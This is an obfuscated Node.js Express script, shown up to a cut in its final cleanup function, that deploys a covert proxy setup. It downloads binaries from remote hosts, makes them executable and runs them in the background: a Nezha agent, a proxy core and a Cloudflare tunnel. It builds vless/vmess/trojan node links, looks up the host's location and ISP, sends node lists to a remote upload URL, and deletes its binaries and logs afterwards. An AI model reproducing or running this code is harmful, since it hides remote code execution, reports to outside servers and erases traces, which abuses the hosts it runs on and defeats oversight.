const _0x14e858=_0xb013;(function(_0x4667ed,_0x455d2a){const _0x5ed3f9={_0x41cc33:0x105,_0x4f32f8:0xcf,_0x11cf82:0x171,_0x42359b:0x15d,_0x1fce2d:0xe5,_0x2612d6:0xc4},_0x1595f6=_0xb013,_0x2a6842=_0x4667ed();while(!![]){try{const _0x28dfbc=parseInt(_0x1595f6(0x11e))/0x1*(parseInt(_0x1595f6(_0x5ed3f9._0x41cc33))/0x2)+parseInt(_0x1595f6(0x10a))/0x3+-parseInt(_0x1595f6(_0x5ed3f9._0x4f32f8))/0x4*(parseInt(_0x1595f6(_0x5ed3f9._0x11cf82))/0x5)+parseInt(_0x1595f6(_0x5ed3f9._0x42359b))/0x6+parseInt(_0x1595f6(_0x5ed3f9._0x1fce2d))/0x7+parseInt(_0x1595f6(_0x5ed3f9._0x2612d6))/0x8+parseInt(_0x1595f6(0xf4))/0x9*(-parseInt(_0x1595f6(0xc5))/0xa);if(_0x28dfbc===_0x455d2a)break;else _0x2a6842['push'](_0x2a6842['shift']());}catch(_0x31693b){_0x2a6842['push'](_0x2a6842['shift']());}}}(_0x199a,0x8bd99));const express=require(_0x14e858(0x172)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x14e858(0xde)),{promisify}=require(_0x14e858(0xbe)),exec=promisify(require(_0x14e858(0x165))['exec']),UPLOAD_URL=process[_0x14e858(0x140)][_0x14e858(0x132)]||'',PROJECT_URL=process[_0x14e858(0x140)][_0x14e858(0x13f)]||'',AUTO_ACCESS=process[_0x14e858(0x140)][_0x14e858(0xb9)]||![],FILE_PATH=process[_0x14e858(0x140)][_0x14e858(0xcb)]||_0x14e858(0x12b),SUB_PATH=process['env'][_0x14e858(0x103)]||_0x14e858(0xb1),PORT=process[_0x14e858(0x140)]['SERVER_PORT']||process[_0x14e858(0x140)][_0x14e858(0x147)]||0xbb8,UUID=process['env'][_0x14e858(0xc1)]||_0x14e858(0xdf),NEZHA_SERVER=process[_0x14e858(0x140)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x14e858(0x140)][_0x14e858(0xbc)]||'',NEZHA_KEY=process[_0x14e858(0x140)][_0x14e858(0x118)]||'',ARGO_DOMAIN=process[_0x14e858(0x140)][_0x14e858(0xee)]||_0x14e858(0x168),ARGO_AUTH=process['env'][_0x14e858(0xe1)]||_0x14e858(0xbf),ARGO_PORT=process[_0x14e858(0x140)][_0x14e858(0x12d)]||0x1f41,CFIP=process[_0x14e858(0x140)][_0x14e858(0x139)]||'cdns.doon.eu.org',CFPORT=process['env'][_0x14e858(0xf2)]||0x1bb,NAME=process[_0x14e858(0x140)][_0x14e858(0x10d)]||_0x14e858(0x164);!fs[_0x14e858(0x16b)](FILE_PATH)?(fs[_0x14e858(0xb8)](FILE_PATH),console[_0x14e858(0x128)](FILE_PATH+_0x14e858(0x107))):console[_0x14e858(0x128)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x4756bb={_0x20371:0xf1,_0x3d429e:0xb3},_0x596cf7=_0x14e858,_0x5d04bc=_0x596cf7(_0x4756bb._0x20371);let _0x3727d6='';for(let _0x365e37=0x0;_0x365e37<0x6;_0x365e37++){_0x3727d6+=_0x5d04bc[_0x596cf7(_0x4756bb._0x3d429e)](Math['floor'](Math['random']()*_0x5d04bc['length']));}return _0x3727d6;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x14e858(0x134)](FILE_PATH,npmName),phpPath=path[_0x14e858(0x134)](FILE_PATH,phpName),webPath=path[_0x14e858(0x134)](FILE_PATH,webName),botPath=path[_0x14e858(0x134)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x14e858(0x100)),bootLogPath=path['join'](FILE_PATH,_0x14e858(0x14f)),configPath=path[_0x14e858(0x134)](FILE_PATH,_0x14e858(0x109));function deleteNodes(){const _0x32ddc4={_0x48b14c:0xd7,_0x1e7157:0x121,_0x4d1818:0x149},_0xc0fbcc=_0x14e858;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2dddef;try{_0x2dddef=fs[_0xc0fbcc(0x108)](subPath,_0xc0fbcc(0x15e));}catch{return null;}const _0x32abbd=Buffer[_0xc0fbcc(_0x32ddc4._0x48b14c)](_0x2dddef,_0xc0fbcc(0xe8))['toString'](_0xc0fbcc(0x15e)),_0x4aac8e=_0x32abbd[_0xc0fbcc(_0x32ddc4._0x1e7157)]('\x0a')[_0xc0fbcc(0x162)](_0x3fd27a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xc0fbcc(0xb6)](_0x3fd27a));if(_0x4aac8e[_0xc0fbcc(0x153)]===0x0)return;return axios[_0xc0fbcc(_0x32ddc4._0x4d1818)](UPLOAD_URL+_0xc0fbcc(0x145),JSON[_0xc0fbcc(0xf0)]({'nodes':_0x4aac8e}),{'headers':{'Content-Type':_0xc0fbcc(0x125)}})[_0xc0fbcc(0xfe)](_0x4a7b27=>{return null;}),null;}catch(_0x5e0385){return null;}}function cleanupOldFiles(){const _0x4ec70a={_0x248575:0xdc},_0x4247dd=_0x14e858;try{const _0x13af6c=fs[_0x4247dd(0xfb)](FILE_PATH);_0x13af6c['forEach'](_0x270320=>{const _0x59a537=_0x4247dd,_0x4938ae=path['join'](FILE_PATH,_0x270320);try{const _0x461ddb=fs[_0x59a537(_0x4ec70a._0x248575)](_0x4938ae);_0x461ddb['isFile']()&&fs['unlinkSync'](_0x4938ae);}catch(_0x26e67f){}});}catch(_0x2f80eb){}}async function generateConfig(){const _0x52fffa={_0x4e02c2:0x117,_0x226205:0x133,_0x29cc21:0x157,_0x19a11a:0xe3,_0x16e7e8:0x10b,_0x2d579b:0x157,_0x2eb023:0x157,_0x3ec565:0xe3,_0x5b027f:0xff,_0x3b2392:0xd0,_0x268d4f:0x10b,_0x317ae3:0x175,_0x5a562e:0x10e,_0x27e804:0x124},_0x19bd90=_0x14e858,_0x2d5b31={'log':{'access':_0x19bd90(0x117),'error':_0x19bd90(_0x52fffa._0x4e02c2),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x19bd90(0xe7),'settings':{'clients':[{'id':UUID,'flow':_0x19bd90(_0x52fffa._0x226205)}],'decryption':_0x19bd90(_0x52fffa._0x29cc21),'fallbacks':[{'dest':0xbb9},{'path':_0x19bd90(_0x52fffa._0x19a11a),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x19bd90(0xed)}},{'port':0xbb9,'listen':_0x19bd90(_0x52fffa._0x16e7e8),'protocol':_0x19bd90(0xe7),'settings':{'clients':[{'id':UUID}],'decryption':_0x19bd90(_0x52fffa._0x2d579b)},'streamSettings':{'network':'tcp','security':_0x19bd90(0x157)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x19bd90(0xe7),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x19bd90(_0x52fffa._0x2d579b)},'streamSettings':{'network':'ws','security':_0x19bd90(_0x52fffa._0x2eb023),'wsSettings':{'path':_0x19bd90(_0x52fffa._0x3ec565)}},'sniffing':{'enabled':!![],'destOverride':[_0x19bd90(0x136),_0x19bd90(_0x52fffa._0x5b027f),_0x19bd90(0xce)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x19bd90(_0x52fffa._0x3b2392)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x19bd90(0xce)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x19bd90(_0x52fffa._0x268d4f),'protocol':_0x19bd90(0x14e),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x19bd90(_0x52fffa._0x29cc21),'wsSettings':{'path':_0x19bd90(0xf3)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x19bd90(_0x52fffa._0x5b027f),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x19bd90(_0x52fffa._0x317ae3)]},'outbounds':[{'protocol':_0x19bd90(_0x52fffa._0x5a562e),'tag':_0x19bd90(_0x52fffa._0x27e804)},{'protocol':'blackhole','tag':_0x19bd90(0x13e)}]};fs[_0x19bd90(0x161)](path[_0x19bd90(0x134)](FILE_PATH,'config.json'),JSON[_0x19bd90(0xf0)](_0x2d5b31,null,0x2));}function _0xb013(_0x49e663,_0x314b31){const _0x199a7a=_0x199a();return _0xb013=function(_0xb01339,_0x12c684){_0xb01339=_0xb01339-0xb1;let _0x59dfd5=_0x199a7a[_0xb01339];return _0x59dfd5;},_0xb013(_0x49e663,_0x314b31);}function getSystemArchitecture(){const _0x5386d8={_0x4cac32:0x151,_0x260db9:0x111},_0x499607=_0x14e858,_0x4a528a=os['arch']();return _0x4a528a===_0x499607(_0x5386d8._0x4cac32)||_0x4a528a===_0x499607(0x129)||_0x4a528a===_0x499607(_0x5386d8._0x260db9)?'arm':_0x499607(0x15a);}function downloadFile(_0x2aa8aa,_0x23e756,_0x4c73c2){const _0x26364c={_0xe93a37:0x16b,_0x6fb521:0xb8,_0x3a8861:0x10c},_0x112857={_0x48cb63:0x144,_0xcc85a8:0xc2},_0x5d26dc={_0x26d9c7:0xc2},_0x1f14c2=_0x14e858,_0x5745ce=_0x2aa8aa;!fs[_0x1f14c2(_0x26364c._0xe93a37)](FILE_PATH)&&fs[_0x1f14c2(_0x26364c._0x6fb521)](FILE_PATH,{'recursive':!![]});const _0x1c0f18=fs[_0x1f14c2(0x130)](_0x5745ce);axios({'method':'get','url':_0x23e756,'responseType':'stream'})[_0x1f14c2(_0x26364c._0x3a8861)](_0x226ca9=>{const _0x6a6725={_0xbadbd9:0xec,_0x18b5dd:0x174,_0x3732d9:0x101},_0x372ebc={_0x4530b5:0xf8,_0x2f51f0:0x116},_0x577f28=_0x1f14c2;_0x226ca9['data']['pipe'](_0x1c0f18),_0x1c0f18['on'](_0x577f28(0xe6),()=>{const _0x20ee38=_0x577f28;_0x1c0f18[_0x20ee38(_0x372ebc._0x4530b5)](),console[_0x20ee38(0x128)](_0x20ee38(0x144)+path[_0x20ee38(0xec)](_0x5745ce)+_0x20ee38(_0x372ebc._0x2f51f0)),_0x4c73c2(null,_0x5745ce);}),_0x1c0f18['on'](_0x577f28(_0x5d26dc._0x26d9c7),_0x44319f=>{const _0x4a0c26=_0x577f28;fs[_0x4a0c26(0xba)](_0x5745ce,()=>{});const _0x5b65ce=_0x4a0c26(0x144)+path[_0x4a0c26(_0x6a6725._0xbadbd9)](_0x5745ce)+_0x4a0c26(_0x6a6725._0x18b5dd)+_0x44319f[_0x4a0c26(_0x6a6725._0x3732d9)];console['error'](_0x5b65ce),_0x4c73c2(_0x5b65ce);});})['catch'](_0x16f5c8=>{const _0x5b127f=_0x1f14c2,_0x960aa1=_0x5b127f(_0x112857._0x48cb63)+path[_0x5b127f(0xec)](_0x5745ce)+_0x5b127f(0x174)+_0x16f5c8[_0x5b127f(0x101)];console[_0x5b127f(_0x112857._0xcc85a8)](_0x960aa1),_0x4c73c2(_0x960aa1);});}async function downloadFilesAndRun(){const _0x10eeeb={_0x274afd:0x128,_0x2ea1bf:0xcd,_0x552202:0x150,_0x1275f8:0x16d,_0x5f1cbb:0x12c,_0x5ba579:0x113,_0x4c9a2c:0xef,_0x1a9990:0xf7,_0x4faa8f:0x119,_0x428365:0xc7,_0x3b7331:0xc2,_0x239985:0x178,_0x3823bb:0x11c,_0x14a6b1:0xda,_0x4a4da4:0x128,_0x48511f:0x112,_0x21474e:0x13b,_0x1ece74:0x128,_0x1126e0:0x14a,_0x36b7bc:0x119,_0x549dc3:0x14c},_0x563232={_0x994560:0x106},_0x407c83={_0x43d1ef:0x16a},_0x4d5baa=_0x14e858,_0x4bcdb9=getSystemArchitecture(),_0xc3ad01=getFilesForArchitecture(_0x4bcdb9);if(_0xc3ad01['length']===0x0){console[_0x4d5baa(_0x10eeeb._0x274afd)](_0x4d5baa(0x160));return;}const _0xe08e7=_0xc3ad01['map'](_0x9b4d30=>{const _0x3c205a={_0x489424:0x13a};return new Promise((_0x480d3e,_0x4c9787)=>{const _0x2510f9=_0xb013;downloadFile(_0x9b4d30['fileName'],_0x9b4d30[_0x2510f9(_0x3c205a._0x489424)],(_0x89b384,_0x4510fc)=>{_0x89b384?_0x4c9787(_0x89b384):_0x480d3e(_0x4510fc);});});});try{await Promise[_0x4d5baa(_0x10eeeb._0x2ea1bf)](_0xe08e7);}catch(_0x7f5651){console['error'](_0x4d5baa(_0x10eeeb._0x552202),_0x7f5651);return;}function _0x2baf1c(_0x5bf8a1){const _0x383eee={_0x99fe36:0xb2},_0x32fb35=_0x4d5baa,_0x118057=0x1fd;_0x5bf8a1[_0x32fb35(_0x563232._0x994560)](_0x3ad70c=>{const _0x2fe393=_0x32fb35;fs[_0x2fe393(0x16b)](_0x3ad70c)&&fs[_0x2fe393(_0x407c83._0x43d1ef)](_0x3ad70c,_0x118057,_0x133f2f=>{const _0x5d255f=_0x2fe393;_0x133f2f?console['error']('Empowerment\x20failed\x20for\x20'+_0x3ad70c+':\x20'+_0x133f2f):console[_0x5d255f(0x128)](_0x5d255f(0x10f)+_0x3ad70c+':\x20'+_0x118057[_0x5d255f(_0x383eee._0x99fe36)](0x8));});});}const _0x369a72=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2baf1c(_0x369a72);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2309af=NEZHA_SERVER[_0x4d5baa(0xda)](':')?NEZHA_SERVER['split'](':')[_0x4d5baa(0x11d)]():'',_0x239fc4=new Set(['443',_0x4d5baa(_0x10eeeb._0x1275f8),_0x4d5baa(_0x10eeeb._0x5f1cbb),_0x4d5baa(0x178),_0x4d5baa(_0x10eeeb._0x5ba579),'2053']),_0x376d07=_0x239fc4['has'](_0x2309af)?_0x4d5baa(0xb4):'false',_0x186810=_0x4d5baa(0xd8)+NEZHA_KEY+_0x4d5baa(0xdd)+NEZHA_SERVER+_0x4d5baa(_0x10eeeb._0x4c9a2c)+_0x376d07+_0x4d5baa(_0x10eeeb._0x1a9990)+UUID;fs[_0x4d5baa(0x161)](path[_0x4d5baa(0x134)](FILE_PATH,_0x4d5baa(0x146)),_0x186810);const _0x7379c6=_0x4d5baa(_0x10eeeb._0x4faa8f)+phpPath+_0x4d5baa(0x13d)+FILE_PATH+_0x4d5baa(_0x10eeeb._0x428365);try{await exec(_0x7379c6),console[_0x4d5baa(0x128)](phpName+'\x20is\x20running'),await new Promise(_0x47a3f0=>setTimeout(_0x47a3f0,0x3e8));}catch(_0x4807dd){console[_0x4d5baa(_0x10eeeb._0x3b7331)]('php\x20running\x20error:\x20'+_0x4807dd);}}else{let _0x2aa4ce='';const _0x5cbcbe=['443','8443','2096',_0x4d5baa(_0x10eeeb._0x239985),'2083',_0x4d5baa(_0x10eeeb._0x3823bb)];_0x5cbcbe[_0x4d5baa(_0x10eeeb._0x14a6b1)](NEZHA_PORT)&&(_0x2aa4ce=_0x4d5baa(0x16c));const _0x1f772c='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4d5baa(0x159)+NEZHA_KEY+'\x20'+_0x2aa4ce+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1f772c),console[_0x4d5baa(_0x10eeeb._0x4a4da4)](npmName+_0x4d5baa(_0x10eeeb._0x48511f)),await new Promise(_0x38761c=>setTimeout(_0x38761c,0x3e8));}catch(_0x30074a){console['error'](_0x4d5baa(0x126)+_0x30074a);}}}else console[_0x4d5baa(0x128)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x315d1a=_0x4d5baa(0x119)+webPath+_0x4d5baa(_0x10eeeb._0x21474e)+FILE_PATH+_0x4d5baa(0xd5);try{await exec(_0x315d1a),console[_0x4d5baa(_0x10eeeb._0x1ece74)](webName+_0x4d5baa(_0x10eeeb._0x48511f)),await new Promise(_0x12b54c=>setTimeout(_0x12b54c,0x3e8));}catch(_0x7cbc49){console[_0x4d5baa(0xc2)](_0x4d5baa(0x173)+_0x7cbc49);}if(fs[_0x4d5baa(0x16b)](botPath)){let _0x3b09a3;if(ARGO_AUTH[_0x4d5baa(_0x10eeeb._0x1126e0)](/^[A-Z0-9a-z=]{120,250}$/))_0x3b09a3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x3b09a3=_0x4d5baa(0x16e)+FILE_PATH+_0x4d5baa(0x141):_0x3b09a3=_0x4d5baa(0x177)+FILE_PATH+_0x4d5baa(0x11f)+ARGO_PORT;try{await exec(_0x4d5baa(_0x10eeeb._0x36b7bc)+botPath+'\x20'+_0x3b09a3+_0x4d5baa(_0x10eeeb._0x549dc3)),console[_0x4d5baa(_0x10eeeb._0x1ece74)](botName+'\x20is\x20running'),await new Promise(_0x26942b=>setTimeout(_0x26942b,0x7d0));}catch(_0xfac7b9){console[_0x4d5baa(0xc2)](_0x4d5baa(0xc6)+_0xfac7b9);}}await new Promise(_0x26cf5d=>setTimeout(_0x26cf5d,0x1388));}function getFilesForArchitecture(_0x2eceab){const _0x576d70={_0x33c781:0x12f,_0x180912:0xe0,_0x55d81c:0x151,_0x33f4ce:0xb7},_0x312ded=_0x14e858;let _0x149297;_0x2eceab==='arm'?_0x149297=[{'fileName':webPath,'fileUrl':_0x312ded(_0x576d70._0x33c781)},{'fileName':botPath,'fileUrl':_0x312ded(0x156)}]:_0x149297=[{'fileName':webPath,'fileUrl':_0x312ded(0x167)},{'fileName':botPath,'fileUrl':_0x312ded(0x114)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4de169=_0x2eceab==='arm'?_0x312ded(_0x576d70._0x180912):_0x312ded(0x138);_0x149297[_0x312ded(0xb7)]({'fileName':npmPath,'fileUrl':_0x4de169});}else{const _0x23c14b=_0x2eceab===_0x312ded(_0x576d70._0x55d81c)?'https://arm64.ssss.nyc.mn/v1':_0x312ded(0x148);_0x149297[_0x312ded(_0x576d70._0x33f4ce)]({'fileName':phpPath,'fileUrl':_0x23c14b});}}return _0x149297;}function argoType(){const _0x1a6a32={_0x3195ad:0x128,_0x5bcc38:0xc3,_0x347c5c:0x102,_0x4f11ae:0x161,_0x53128d:0xc9,_0x42ea25:0xfd,_0x5f1ff7:0x135,_0x55d2fe:0x137,_0x2c3790:0x134,_0x520270:0x14d},_0xd144bf=_0x14e858;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xd144bf(_0x1a6a32._0x3195ad)](_0xd144bf(_0x1a6a32._0x5bcc38));return;}if(ARGO_AUTH[_0xd144bf(0xda)](_0xd144bf(_0x1a6a32._0x347c5c))){fs[_0xd144bf(_0x1a6a32._0x4f11ae)](path[_0xd144bf(0x134)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x4abebf=_0xd144bf(_0x1a6a32._0x53128d)+ARGO_AUTH['split']('\x22')[0xb]+_0xd144bf(_0x1a6a32._0x42ea25)+path['join'](FILE_PATH,_0xd144bf(_0x1a6a32._0x5f1ff7))+_0xd144bf(0xbd)+ARGO_DOMAIN+_0xd144bf(_0x1a6a32._0x55d2fe)+ARGO_PORT+_0xd144bf(0xb5);fs['writeFileSync'](path[_0xd144bf(_0x1a6a32._0x2c3790)](FILE_PATH,_0xd144bf(0x127)),_0x4abebf);}else console[_0xd144bf(0x128)](_0xd144bf(_0x1a6a32._0x520270));}async function extractDomains(){const _0x3b5ce5={_0x19ab59:0x108,_0x5f53d9:0x121,_0x2858d5:0x106,_0x177b5b:0x128,_0x28c8ef:0x134,_0x5c23ea:0x14f,_0x38ab18:0x177,_0x31dc4b:0x128,_0x3e3b6a:0xc2,_0x2a13bc:0xc6},_0x328f35={_0x2c3370:0x155,_0x3ff023:0xf6,_0xf6e1c6:0x155,_0x49258b:0x131,_0x3093cb:0x110,_0x33368d:0x104,_0x48d211:0x155,_0x3a202b:0x110},_0x6cf635={_0x2b7cca:0x166,_0x2b79ca:0xd3,_0x22883c:0xe4,_0x5e2038:0xf9},_0x1eaf70=_0x14e858;let _0x5c0f80;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5c0f80=ARGO_DOMAIN,console['log'](_0x1eaf70(0x158),_0x5c0f80),await _0x3c4001(_0x5c0f80);else try{const _0x2ad4fa=fs[_0x1eaf70(_0x3b5ce5._0x19ab59)](path['join'](FILE_PATH,'boot.log'),_0x1eaf70(0x15e)),_0x46e166=_0x2ad4fa[_0x1eaf70(_0x3b5ce5._0x5f53d9)]('\x0a'),_0x2fe811=[];_0x46e166[_0x1eaf70(_0x3b5ce5._0x2858d5)](_0x458667=>{const _0x6d87ec=_0x1eaf70,_0x4fc095=_0x458667['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4fc095){const _0x3105bf=_0x4fc095[0x1];_0x2fe811[_0x6d87ec(0x169)](_0x3105bf);}});if(_0x2fe811['length']>0x0)_0x5c0f80=_0x2fe811[0x0],console[_0x1eaf70(_0x3b5ce5._0x177b5b)]('ArgoDomain:',_0x5c0f80),await _0x3c4001(_0x5c0f80);else{console[_0x1eaf70(0x128)](_0x1eaf70(0x120)),fs['unlinkSync'](path[_0x1eaf70(_0x3b5ce5._0x28c8ef)](FILE_PATH,_0x1eaf70(_0x3b5ce5._0x5c23ea)));async function _0x1027b5(){const _0x2ed9fa=_0x1eaf70;try{process[_0x2ed9fa(0xd6)]===_0x2ed9fa(_0x6cf635._0x2b7cca)?await exec(_0x2ed9fa(_0x6cf635._0x2b79ca)+botName+_0x2ed9fa(_0x6cf635._0x22883c)):await exec(_0x2ed9fa(0xca)+botName['charAt'](0x0)+']'+botName[_0x2ed9fa(_0x6cf635._0x5e2038)](0x1)+_0x2ed9fa(0x122));}catch(_0x78fd41){}}_0x1027b5(),await new Promise(_0x6eb09d=>setTimeout(_0x6eb09d,0xbb8));const _0x19ee12=_0x1eaf70(_0x3b5ce5._0x38ab18)+FILE_PATH+_0x1eaf70(0x11f)+ARGO_PORT;try{await exec(_0x1eaf70(0x119)+botPath+'\x20'+_0x19ee12+'\x20>/dev/null\x202>&1\x20&'),console[_0x1eaf70(_0x3b5ce5._0x31dc4b)](botName+_0x1eaf70(0x112)),await new Promise(_0x3ac6fd=>setTimeout(_0x3ac6fd,0xbb8)),await extractDomains();}catch(_0x4185a7){console[_0x1eaf70(_0x3b5ce5._0x3e3b6a)](_0x1eaf70(_0x3b5ce5._0x2a13bc)+_0x4185a7);}}}catch(_0xa2b7b8){console[_0x1eaf70(_0x3b5ce5._0x3e3b6a)](_0x1eaf70(0xe2),_0xa2b7b8);}async function _0x1837e1(){const _0x580dbe=_0x1eaf70;try{const _0x187471=await axios[_0x580dbe(0x143)]('https://ipapi.co/json',{'timeout':0xbb8});if(_0x187471[_0x580dbe(0x155)]&&_0x187471['data']['country_code']&&_0x187471[_0x580dbe(_0x328f35._0x2c3370)]['org'])return _0x187471[_0x580dbe(_0x328f35._0x2c3370)][_0x580dbe(_0x328f35._0x3ff023)]+'_'+_0x187471[_0x580dbe(0x155)]['org'];}catch(_0x3a1949){try{const _0x1b4322=await axios[_0x580dbe(0x143)](_0x580dbe(0x152),{'timeout':0xbb8});if(_0x1b4322[_0x580dbe(0x155)]&&_0x1b4322[_0x580dbe(_0x328f35._0xf6e1c6)]['status']===_0x580dbe(_0x328f35._0x49258b)&&_0x1b4322[_0x580dbe(0x155)]['countryCode']&&_0x1b4322[_0x580dbe(0x155)][_0x580dbe(_0x328f35._0x3093cb)])return _0x1b4322['data'][_0x580dbe(_0x328f35._0x33368d)]+'_'+_0x1b4322[_0x580dbe(_0x328f35._0x48d211)][_0x580dbe(_0x328f35._0x3a202b)];}catch(_0x946817){}}return _0x580dbe(0x11b);}async function _0x3c4001(_0x16c2e7){const _0x524d7f={_0x2c5e9b:0x157,_0x3d4b0f:0x13c,_0x561037:0x16f,_0x5d6c10:0x12a,_0x50d232:0x128,_0x8c7396:0xd7,_0x5f4dba:0xe8,_0x221961:0x143},_0x43db88=await _0x1837e1(),_0x1c3e43=NAME?NAME+'-'+_0x43db88:_0x43db88;return new Promise(_0x5d2ed4=>{const _0xe6e2ba={_0x26c976:0xd7,_0x4f78a0:0xd1,_0x21637a:0xc0};setTimeout(()=>{const _0x4ffe9b=_0xb013,_0x1235cf={'v':'2','ps':''+_0x1c3e43,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x4ffe9b(_0x524d7f._0x2c5e9b),'host':_0x16c2e7,'path':'/vmess-argo?ed=2560','tls':_0x4ffe9b(0xff),'sni':_0x16c2e7,'alpn':'','fp':'firefox'},_0x31ebdc='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x4ffe9b(_0x524d7f._0x3d4b0f)+_0x16c2e7+'&fp=firefox&type=ws&host='+_0x16c2e7+_0x4ffe9b(_0x524d7f._0x561037)+_0x1c3e43+_0x4ffe9b(0xeb)+Buffer['from'](JSON[_0x4ffe9b(0xf0)](_0x1235cf))[_0x4ffe9b(0xb2)](_0x4ffe9b(0xe8))+_0x4ffe9b(_0x524d7f._0x5d6c10)+UUID+'@'+CFIP+':'+CFPORT+_0x4ffe9b(0x14b)+_0x16c2e7+'&fp=firefox&type=ws&host='+_0x16c2e7+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x1c3e43+_0x4ffe9b(0x176);console[_0x4ffe9b(_0x524d7f._0x50d232)](Buffer[_0x4ffe9b(_0x524d7f._0x8c7396)](_0x31ebdc)['toString'](_0x4ffe9b(0xe8))),fs[_0x4ffe9b(0x161)](subPath,Buffer['from'](_0x31ebdc)['toString'](_0x4ffe9b(_0x524d7f._0x5f4dba))),console[_0x4ffe9b(0x128)](FILE_PATH+_0x4ffe9b(0xc8)),uploadNodes(),app[_0x4ffe9b(_0x524d7f._0x221961)]('/'+SUB_PATH,(_0x14a49b,_0xce7c30)=>{const _0x9cb951=_0x4ffe9b,_0x529f72=Buffer[_0x9cb951(_0xe6e2ba._0x26c976)](_0x31ebdc)['toString'](_0x9cb951(0xe8));_0xce7c30[_0x9cb951(0x154)](_0x9cb951(0x11a),_0x9cb951(_0xe6e2ba._0x4f78a0)),_0xce7c30[_0x9cb951(_0xe6e2ba._0x21637a)](_0x529f72);}),_0x5d2ed4(_0x31ebdc);},0x7d0);});}}async function uploadNodes(){const _0x310385={_0x51ac0c:0x125,_0x35f104:0x128,_0x1a5fdc:0x15c,_0x40bcd9:0x108,_0x1a8f04:0x153,_0x104226:0xf0,_0x4f7b40:0x149,_0x303029:0xfa,_0x46520d:0xe9},_0x348d23=_0x14e858;if(UPLOAD_URL&&PROJECT_URL){const _0x2fa1f5=PROJECT_URL+'/'+SUB_PATH,_0x3d97c9={'subscription':[_0x2fa1f5]};try{const _0x34f0da=await axios['post'](UPLOAD_URL+_0x348d23(0x115),_0x3d97c9,{'headers':{'Content-Type':_0x348d23(_0x310385._0x51ac0c)}});return _0x34f0da&&_0x34f0da['status']===0xc8?(console[_0x348d23(_0x310385._0x35f104)](_0x348d23(0xd4)),_0x34f0da):null;}catch(_0xc0696d){if(_0xc0696d['response']){if(_0xc0696d[_0x348d23(0x142)][_0x348d23(_0x310385._0x1a5fdc)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0xb46520=fs[_0x348d23(_0x310385._0x40bcd9)](listPath,_0x348d23(0x15e)),_0x32b082=_0xb46520[_0x348d23(0x121)]('\x0a')[_0x348d23(0x162)](_0x3f9cfa=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x348d23(0xb6)](_0x3f9cfa));if(_0x32b082[_0x348d23(_0x310385._0x1a8f04)]===0x0)return;const _0x59606c=JSON[_0x348d23(_0x310385._0x104226)]({'nodes':_0x32b082});try{const _0x63bea=await axios[_0x348d23(_0x310385._0x4f7b40)](UPLOAD_URL+_0x348d23(_0x310385._0x303029),_0x59606c,{'headers':{'Content-Type':_0x348d23(0x125)}});return _0x63bea&&_0x63bea['status']===0xc8?(console[_0x348d23(0x128)](_0x348d23(_0x310385._0x46520d)),_0x63bea):null;}catch(_0x10f00e){return null;}}else return;}}function cleanFiles(){const _0x516f6f={_0x385a09:0x169,_0x4d6702:0xd6,_0x1e0856:0xdb,_0x445799:0x134},_0x27f3d6={_0x370e8f:0x123,_0x16bea5:0xfc,_0x37f1ab:0xf5};setTimeout(()=>{const _0x311327=_0xb013,_0x291a61=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x291a61[_0x311327(_0x516f6f._0x385a09)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x291a61[_0x311327(0x169)](phpPath);process[_0x311327(_0x516f6f._0x4d6702)]===_0x311327(0x166)?exec('del\x20/f\x20/q\x20'+_0x291a61['join']('\x20')+_0x311327(_0x516f6f._0x1e0856),_0x3959d7=>{const _0x5ce56e=_0x311327;console[_0x5ce56e(_0x27f3d6._0x370e8f)](),console[_0x5ce56e(0x128)](_0x5ce56e(_0x27f3d6._0x16bea5)),console[_0x5ce56e(0x128)](_0x5ce56e(_0x27f3d6._0x37f1ab));}):exec('rm\x20-rf\x20'+_0x291a61[_0x311327(_0x516f6f._0x445799)]('\x20')+'\x20>/dev/null\x202>&1',_0x4c5388=>{const 